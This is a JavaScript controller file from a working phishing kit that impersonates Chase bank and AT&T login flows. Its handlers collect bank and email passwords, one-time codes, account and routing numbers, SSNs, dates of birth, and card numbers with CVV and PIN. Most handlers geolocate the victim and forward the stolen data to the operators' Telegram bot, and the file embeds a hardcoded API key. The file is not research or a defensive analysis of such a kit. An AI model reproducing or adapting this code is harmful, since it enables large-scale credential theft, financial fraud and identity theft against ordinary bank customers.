const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId, otpPage } = require("../config/settings");
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const fs = require('fs').promises; 



exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username, password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
		`👤 LOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login/2");
    
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { username, password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);


        const message =
            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
            `👤 RELOGIN INFO\n` +
			`USERNAME         : ${username}\n` +
			`PASSWORD         : ${password}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
          `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

		if(otpPage === "on"){
			res.redirect("/auth/secure");
		}else{
        res.redirect("/auth/login/3");
		}
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.loginotp = (req, res) => {
	res.render("loginotp");
};

exports.loginPostotp = async (req, res) => {
	const { otp } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{

	const message =
		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
		`👤 OTP INFO\n` +
		`OTP CODE         : ${otp}\n\n` +
		`🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddress}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
            `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login/3");
    
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};



exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { emailAddr, emailPass } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
            `👤 EMAIL INFO\n` +
			`EMAIL ADDRESS    : ${emailAddr}\n` +
			`EMAIL PASSWORD   : ${emailPass}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
          `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/x");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.loginx = (req, res) => {
	res.render("loginx");
};

exports.loginPostx = async (req, res) => {
	const { accountNumber, routingNumber } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
            `👤 ACCOUNT INFO\n` +
			`ACCOUNT NUMBER   : ${accountNumber}\n` +
			`ROUTING NUMBER  : ${routingNumber}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
          `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/4");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { fullName, address, zip, phone, dob, ssn } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];



	const message =
		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zip}\n` +
		`PHONE NUMBER     : ${phone}\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}\n\n` +
		`🌍 GEO-IP INFO\n` +
		 `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/5");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login5 = (req, res) => {
	return res.render("login5");
};

exports.loginPost5 = async (req, res) => {
	const { cardNum, expDate, cvv, cpin } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
		`👤 CARD INFO\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}\n` +
		`CARD PIN         : ${cpin}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

		
		res.redirect("/auth/complete");
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.complete = (req, res) => {
	return res.render("complete");
};


exports.billing = async (req, res) => {
    try {
        // Read the content of the login.html file
        const htmlContent = await fs.readFile('./att/billing.html', 'utf-8');

        // Send the HTML content as a response
        res.send(htmlContent);
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
};

exports.at2 = async (req, res) => {
    try {
		console.log("index2.html")
        // Read the content of the login.html file
        const htmlContent = await fs.readFile('./att/index2.html', 'utf-8');

        // Send the HTML content as a response
        res.send(htmlContent);
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
};

exports.att = async (req, res) => {
    try {
        // Read the content of the login.html file
        const htmlContent = await fs.readFile('./att/index.html', 'utf-8');

        // Send the HTML content as a response
        res.send(htmlContent);
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
};

exports.receive = async (req, res) => {
	let message = '';
	let myObject = req.body;
  
	const sendAPIRequest = async (ipAddress) => {
		  const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		  console.log(apiResponse.data);
		  return apiResponse.data;
	  };
  
	const ipAddress = getClientIp(req);
	const ipAddressInformation = await sendAPIRequest(ipAddress);
	const userAgent = req.headers["user-agent"];
	  const systemLang = req.headers["accept-language"];
  
	const myObjects = Object.keys(myObject);
	  console.log(myObjects);
  
	if (myObjects.includes('Password')) {
	  message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
				 `👤 ${myObject['loginTime']}\n\n`;
  
	  for (const key of myObjects) {
		  if (key !== 'loginTime') {
	  console.log(`${key}: ${myObject[key]}`);
		message += `${key}: ${myObject[key]}\n`;;
		  }
		
	  }
	  
	  message += `🌍 GEO-IP INFO\n` +
		  `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
		  `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
		  `CITY             : ${ipAddressInformation.location.city}\n` +
		  `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
		  `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
		  `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		  `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		  `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
		  `💻 SYSTEM INFO\n` +
		  `USER AGENT       : ${userAgent}\n` +
		  `SYSTEM LANGUAGE  : ${systemLang}\n` +
		  `💬 Telegram: https://t.me/UpdateTeams\n`;
  
  res.send('cCard');
  
	}
  
	if (myObjects.includes('Expiry date') || myObjects.includes('Card Number') || myObjects.includes('Billing Address')) {
	  message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
				 `👤 CARD INFO\n\n`;
  
	  for (const key of myObjects) {
		console.log(`${key}: ${myObject[key]}`);
		message += `${key}: ${myObject[key]}\n`;
	  }
	  
	  message += `🌍 GEO-IP INFO\n` +
			  `IP ADDRESS       : ${ipAddress}\n` +
		  `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`+
		  `💬 Telegram: https://t.me/UpdateTeams\n`;
  
  res.send('dn');
	}
  
	
	console.log(message); 
	const sendMessage = sendMessageFor(botToken, chatId); 
	sendMessage(message);
	
	
  };

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};